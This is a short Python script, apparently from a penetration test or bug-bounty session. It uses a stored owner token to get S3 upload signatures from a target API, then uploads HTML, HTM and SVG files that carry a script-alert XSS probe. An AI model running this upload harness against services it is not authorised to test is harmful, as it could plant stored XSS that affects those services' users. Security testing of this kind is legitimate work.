import json,subprocess,os,uuid,hashlib,base64
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()
def post(path,body):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXH'+uuid.uuid4().hex[:5]
HTML=b'<html><body><script>alert(document.domain)</script>ZXHTMLMARK</body></html>'
md5=base64.b64encode(hashlib.md5(HTML).digest()).decode()
print("=== upload an .html file with script content ===")
for fn in [f'zx-{tag}.html', f'zx-{tag}.htm', f'zx-{tag}.svg']:
    c,b=post('/api/v1/files/s3_upload_signature',
             {"file_name":fn,"model_name":None,"model_id":None,"content_hash":md5})
    print(f"  {fn:20} sign -> {c}")
    if c!='200': continue
    d=json.loads(b); fd=d['formData']; url=d.get('url')
    key=fd.get('key')
    print(f"    key={key}")
    # upload the actual bytes
    args=['curl','-s','-m','60','-o','/tmp/s3','-w','%{http_code}','-X','POST',url]
    for k,v in fd.items(): args+=['--form-string',f'{k}={v}']
    args+=['-F',f'file=@{"/tmp/payload.html"};filename={fn};type=text/html']
    open('/tmp/payload.html','wb').write(HTML)
    p=subprocess.run(args,capture_output=True)
    print(f"    S3 upload -> {p.stdout.decode().strip()}")
    open(f'/tmp/key_{fn.split(".")[-1]}','w').write(key)
